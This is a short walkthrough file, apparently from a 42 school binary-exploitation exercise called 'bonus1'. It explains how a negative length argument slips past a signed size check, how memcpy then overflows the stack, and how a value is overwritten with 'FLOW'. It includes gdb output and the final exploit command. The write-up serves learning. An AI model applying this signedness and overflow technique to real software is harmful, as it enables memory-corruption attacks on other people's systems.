@@ -1,0 +1,36 @@
+# **************************************************************************** #
+#                                                                              #
+#                                                         :::      ::::::::    #
+#    walkthrough                                        :+:      :+:    :+:    #
+#                                                     +:+ +:+         +:+      #
+#    By: lgarczyn <lgarczyn@student.42.fr>          +#+  +:+       +#+         #
+#                                                 +#+#+#+#+#+   +#+            #
+#    Created: 2019/05/08 04:51:49 by lgarczyn          #+#    #+#              #
+#    Updated: 2019/05/08 07:50:34 by lgarczyn         ###   ########.fr        #
+#                                                                              #
+# **************************************************************************** #
+
+The executable takes two argument
+	1: the length of a string
+	2: the string itself
+
+It checks that the string is not too long, but with a signed jump operation (jle).
+Because memcpy takes an unsigned int, we can send a negative len.
+
+This will bypass the first check.
+
+We use a value of "-2147483608" (INTMIN + 40).
+This length translates to a memcpy length of 160 (40 * 4).
+
+The second check compares the second argument again, stored on the stack, to 0x574F4C46.
+
+This part of the stack is overflowed by our attack. We figure out which part.
+(We unset env LINES and COLUMNS before)
+
+(gdb) r -2147483608 ---0---1---2---3---4---5---6---7---8---9--a0--a1--a2--a3--a4--a5--a6--a7--a8--a9--b0--b1--b2--b3--b4--b5--b6--b7--b8--b9
+(gdb) x/4bx $esp+0x3c
+0xbffff62c:	0x2d	0x2d	0x61	0x30
+
+We got "--a0"
+
+./bonus1 -2147483608 ---0---1---2---3---4---5---6---7---8---9`echo -e -n "\x46\x4C\x4F\x57"`
